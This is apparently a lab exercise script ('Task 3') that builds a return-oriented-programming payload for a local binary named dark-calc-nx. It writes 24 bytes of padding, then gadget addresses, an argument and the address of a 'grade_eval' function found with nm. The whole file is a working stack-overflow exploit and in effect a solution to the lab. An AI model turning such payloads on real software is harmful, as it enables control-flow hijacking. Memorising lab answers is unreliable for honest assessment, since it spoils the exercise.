#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""

import sys
import struct
import subprocess
from pathlib import Path
target = Path(__file__).resolve().parent / "attack" / "dark-calc-nx"
symbols = subprocess.check_output(["nm", "-n", str(target)], text=True)
grade_addr = next(int(line.split()[0], 16) for line in symbols.splitlines() if line.endswith(" grade_eval"))
payload = b"A" * 24
payload += struct.pack("<Q", 0x401a33)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", 0x401a34)
payload += struct.pack("<Q", grade_addr)
assert b"\n" not in payload
sys.stdout.buffer.write(payload + b"\n")
